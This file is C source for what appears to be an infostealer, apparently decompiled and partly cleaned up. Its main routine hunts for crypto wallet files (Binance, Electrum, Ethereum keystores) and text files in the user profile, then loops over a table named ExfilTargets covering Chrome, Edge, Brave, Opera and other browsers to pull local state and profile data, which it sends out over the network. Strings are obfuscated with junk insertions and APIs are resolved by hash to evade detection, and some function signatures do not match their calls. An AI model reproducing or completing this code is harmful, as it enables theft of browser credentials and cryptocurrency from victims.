#include "../HEADER/HEADER.h"

void allocateMemory(int16_t flag, void** buffer)
{
    int32_t status = 1;
    int32_t actionFlag = flag;
    void* memoryBlock = allocateMemoryBlock();

    if (!memoryBlock)
        memoryBlock = nullptr;
    else
    {
        *(uint32_t*)((char*)memoryBlock + 0x50) = 6;

        if (!performMemoryCheck(memoryBlock))
        {
            _free(memoryBlock);
            memoryBlock = nullptr;
        }
    }

    int32_t someValue = 8;
    void** result = fetchResult();
    *(uint32_t*)buffer = memoryBlock;
    result[1] = actionFlag;
    *(uint32_t*)result = memoryBlock;
    int32_t resultValue = result[1];
    buffer[1] = resultValue;

    return resultValue;
}

int32_t performMemoryCheck(void* arg)
{
    void* tempArg = arg;
    int32_t result = 0;
    *(uint32_t*)((char*)arg + 0x3c) = SomeFuncCheck;
    *(uint32_t*)((char*)arg + 0x40) = 0;
    *(uint32_t*)((char*)arg + 0x44) = arg;

    if (isMemoryValid(arg))
    {
        *(uint32_t*)((char*)arg + 0x18) = 3;
        int32_t allocationResult = (*(uint32_t*)((char*)arg + 0x28))(*(uint32_t*)((char*)arg + 0x34), 1, 0x400);
        *(uint32_t*)(*(uint32_t*)((char*)arg + 0x48) + 0x48) = allocationResult;

        if (allocationResult)
        {
            result = 1;
            *(uint32_t*)(*(uint32_t*)((char*)arg + 0x48) + 0x50) = 0x400;
        }
        else
        {
            releaseMemory(arg, 0);
            *(uint32_t*)((char*)arg + 0x1c) = 0x10;
        }
    }

    return result;
}

int32_t fetchResult()
{
    return requestMemoryAllocation();
}

int32_t requestMemoryAllocation(uint32_t bytesToAllocate)
{
    uint32_t dwBytes = bytesToAllocate;

    if (dwBytes <= 0xffffffe0)
    {
        if (!dwBytes)
            dwBytes += 1;

        int32_t retryCount;
        do
        {
            int32_t result = HeapAlloc(data_428644, HEAP_NONE, dwBytes);

            if (result)
                return result;

            if (!retryMemoryAllocation())
                break;

            retryCount = handleMemoryRetry(dwBytes);
        } while (retryCount);
    }

    *(uint32_t*)__errno() = 0xc;
    return 0;
}

int32_t __fastcall processPath(
    int32_t sourcePath,
    PWSTR fileExtension,
    int32_t searchPath,
    PWSTR destinationFolder,
    int32_t recursionDepth,
    int32_t** SysInfo
) {
    int32_t* searchBuffer = malloc(260, 2);

    void* getFullPathFunc = ResolveHashes(0x7328f505, u"kernel32.dll");
    getFullPathFunc(searchPath, searchBuffer, searchBufferSize);

    int32_t* resultBuffer = malloc(1, 0x1000);

    int32_t* listBuffer = malloc(1, 0x1000);

    void* fileListPointer = nullptr;
    int32_t iterationCounter = 0;
    int32_t* fileList = listBuffer;

    searchFiles(&fileListPointer, fileExtension, searchPath, resultBuffer, &fileListPointer);

    void* tempFileList = fileListPointer;
    void* currentFile;

    if (fileListPointer) {
        do {
            PWSTR fileName = *(uint32_t*)resultBuffer;
            int32_t* fileDataPtr = &currentFile;
            void* tempBuffer = &resultBuffer[1];

            *(uint32_t*)fileDataPtr = *(uint32_t*)tempBuffer;
            *(uint32_t*)((char*)fileDataPtr + 4) = *(uint32_t*)((char*)tempBuffer + 4);

            int32_t fileSize;
            if (fileSize <= 0xa00000) {
                char* tempBuffer2 = nullptr;
                fileListPointer = nullptr;

                // Process the file
                processFile(&fileListPointer);

                PWSTR fullPathBuffer = Alloc();
                lstrcatW(fullPathBuffer, destinationFolder);
                lstrcatW(fullPathBuffer, L"\\");
                lstrcatW(fullPathBuffer, fileName);

                PSTR resutlStrBrwsrOfshit = convertWideToAnsi(fullPathBuffer);

                if (fileListPointer) {
                    processCollectedFile(
                        handleSystemData(*(uint32_t*)SysInfo, resutlStrBrwsrOfshit),
                        tempBuffer2, *(uint32_t*)SysInfo, fileListPointer
                    );
                    finalizeProcessing(*(uint32_t*)SysInfo);
                }
            }

            resultBuffer += 4;
            tempFileList--;
        } while (tempFileList);
    }

    if (recursionDepth > 0) {
        searchFiles(&iterationCounter, L"*", searchPath, listBuffer, &iterationCounter);

        int32_t subFolderCount = iterationCounter;
        bool hasSubFolders = subFolderCount > 0;

        while (hasSubFolders) {
            PWSTR subFolderName = *(uint32_t*)listBuffer;
            int32_t* subFolderData = &currentFile;
            void* tempSubBuffer = &listBuffer[1];

            *(uint32_t*)subFolderData = *(uint32_t*)tempSubBuffer;
            *(uint32_t*)((char*)subFolderData + 4) = *(uint32_t*)((char*)tempSubBuffer + 4);

            int32_t subFolderSize;
            if (subFolderSize) {
                PWSTR subFolderPath = Alloc();
                lstrcatW(subFolderPath, destinationFolder);
                lstrcatW(subFolderPath, L"\\");
                lstrcatW(subFolderPath, _wcsrchr(currentFile, L'\\') + 1);

                processPath(subFolderPath, recursionDepth - 1, SysInfo);
                _free(subFolderPath);
            }

            listBuffer += 4;
            subFolderCount--;
            hasSubFolders = subFolderCount > 0;
        }
    }

    _free(resultBuffer);
    return _free(listBuffer);
}

void* __stdcall 
ExtractUserData(PWSTR brwsrOfshit, 
                int32_t brwsrPathOfshit, 
                int32_t** SysInfo) 
{
    const WCHAR *resolvedPath = (const WCHAR *)calloc(260, 2);
    void* ResolverSuckerFunc = ResolveHashes(1932064005, (int)L"kernel32.dll"); 
    ResolverSuckerFunc(brwsrPathOfshit, resolvedPath, 260);
    
    WCHAR *TheRealOne = (WCHAR *)calloc(260, 2);
    lstrcatW(TheRealOne, resolvedPath);
    lstrcatW(TheRealOne, GetFilePath((wchar_t *)L"\\Locedx765al Staedx765te"));
    
    void* result = verifyFileStatus(TheRealOne);
    
    if (result) {
        int32_t i = 0;
        void* extractedData = nullptr;
        sub_4020cc(&extractedData);

        PWSTR resutlStrBrwsrOfshit = malloc(0x104);
        lstrcatW(resutlStrBrwsrOfshit, brwsrOfshit);
        lstrcatW(resutlStrBrwsrOfshit, u"\\dp.txt");

        PSTR processedFile = ProccessingOrMapsTheWideCharacter(resutlStrBrwsrOfshit);
        
        if (extractedData) {
            sub_407160(sub_406b24(*(uint32_t*)SysInfo, processedFile), nullptr, *(uint32_t*)SysInfo, extractedData);
            sub_406ed8(*(uint32_t*)SysInfo);
        }

        extractedData = nullptr;
        sub_402a74(&extractedData);
        
        void* profileCache = sub_401ec5(sub_401e7d(sub_401ec5(sub_401e11(nullptr)), "profile.info_cache"));
        
        if (profileCache && *(uint32_t*)((char*)profileCache + 0x18) > 0) {
            do {
                PWSTR profilePath = malloc(0x104);
                int32_t extractedProfile = *(uint32_t*)(*(uint32_t*)((char*)profileCache + 0xc) + (i << 2));

                char* extractedProfileStr = extractedProfile;
                while (*extractedProfileStr) extractedProfileStr++;

                _mbstowcs(profilePath, extractedProfile, extractedProfileStr - extractedProfile + 1);

                PWSTR formattedProfilePath = malloc(0x104);
                lstrcatW(formattedProfilePath, resolvedPath);
                lstrcatW(formattedProfilePath, u"\\profile_data");

                int32_t* profileInfo= malloc(12);
                *(uint32_t*)profileInfo= brwsrOfshit;
                profileDataStruct[2] = profilePath;
                profileDataStruct[1] = formattedProfilePath;

                sub_402345(profileDataStruct, SysInfo);
                _free(profileDataStruct);
                
                i += 1;
            } while (i < *(uint32_t*)((char*)profileCache + 0x18));
        }
    }

    return result;
}

int main(){
  const WCHAR *importedFilesPath;
  const WCHAR *binanceWalletPath;
  const WCHAR *electrumWalletPath;
  const WCHAR *walletEthereumPath;
  void SysInfo;

  allocateMem(1, &SysInfo);

  CollectSysInfo(&SysInfo);
  importedFilesPath = (const WCHAR *)GetFilePath((wchar_t *)L"Importedx765ant Fileedx765s/Proedx765file");
  PWSTR* extension = GetFilePath(u"*.edx765txt");
  PWSTR* userprofile = GetFilePath(u"%userproedx765file%");
  processPath(userprofile, extension, userprofile, importedFilesPath, 2, &SysInfo);

  PWSTR walletPathBinance = GetFilePath(L"Walledx765ets/Binanedx765ce");
  PWSTR* extensionBinance = GetFilePath(L"apedx765p-stoedx765re.jsedx765on");
  PWSTR* appDataPathBinance = GetFilePath(L"%appdaedx765ta%/Binaedx765nce");
  processPath(appDataPathBinance, extensionBinance, appDataPathBinance, walletPathBinance, 1, &SysInfo);

  PWSTR walletPathElectrum = GetFilePath(L"Walledx765ets/Eleedx765ctrum");
  PWSTR* extensionElectrum = GetFilePath(L"*edx765");
  PWSTR* appDataPathElectrum = GetFilePath(L"%appdedx765ata%/Eledx765ectrum");
  processPath(appDataPathElectrum, extensionElectrum, appDataPathElectrum, walletPathElectrum, 1, &SysInfo);

  PWSTR walletPathEthereum = GetFilePath(L"Walledx765ets/Ethedx765ereum");
  PWSTR* extensionEthereum = GetFilePath(L"keystedx765ore");
  PWSTR* appDataPathEthereum = GetFilePath(L"%appdedx765ata%/Etheedx765reum");
  processPath(appDataPathEthereum, extensionEthereum, appDataPathEthereum, walletPathEthereum, 1, &SysInfo);
  
    ProcessAndSendData(&SysInfo); // wininet.dll shities 
  
  allocateMem(2, &SysInfo);
  struct {
      PWSTR brwsrOfshit;
      PWSTR brwsrPathOfshit;
  } ExfilTargets[] = {
      {GetFilePath(L"Chredx765ome"), GetFilePath(L"%loedx765calappedx765data%\\Goedx765ogle\\Chredx765ome\\Usedx765er Datedx765a")},
      {GetFilePath(L"Chromiedx765um"), GetFilePath(L"%localappdata%\\Chroedx765mium\\Useedx765r Data")},
      {GetFilePath(L"Ededx765ge"), GetFilePath(L"%localaedx765ppdata%\\Micedx765rosoft\\Edge\\Usedx765er Data")},
      {GetFilePath(L"Komedx765eta"), GetFilePath(L"%locedx765alappdaedx765ta%\\Komedx765eta\\Usedx765er Daedx765ta")},
      {GetFilePath(L"Vivaedx765ldi"), GetFilePath(L"%localedx765appdata%\\Viedx765valdi\\Usedx765er Data")},
      {GetFilePath(L"Braedx765ve"), GetFilePath(L"%localapedx765pdata%\\Braedx765veSofedx765tware\\Brex765ave-Broedx765wser\\Usedx765er Data")},
      {GetFilePath(L"Opedx765era Staedx765ble"), GetFilePath(L"%appdedx765ata%\\Opeedx765ra Softedx765ware\\Opedx765era Staedx765ble")},
      {GetFilePath(L"Opedx765era Gedx765X Stabedx765le"), GetFilePath(L"%appdedx765ata%\\Opedx765era Softwedx765are\\Opedx765era GX Staedx765ble")},
      {GetFilePath(L"Opedx765era Neoedx765n"), GetFilePath(L"%appdaedx765ta%\\Opedx765era Softwaedx765re\\Opedx765era Neoedx765n\\Usedx765er Daedx765ta")}
  };

  int sizer = sizeof(ExfilTargets) / sizeof(ExfilTargets[0]);
  
  for (int i = 0; i < sizer; i++) {
      ExtractUserData(ExfilTargets[i].brwsrOfshit, ExfilTargets[i].brwsrPathOfshit, &SysInfo);
  }

  ProcessAndSendData(&SysInfo);
  allocateMem(2, &SysInfo);
}
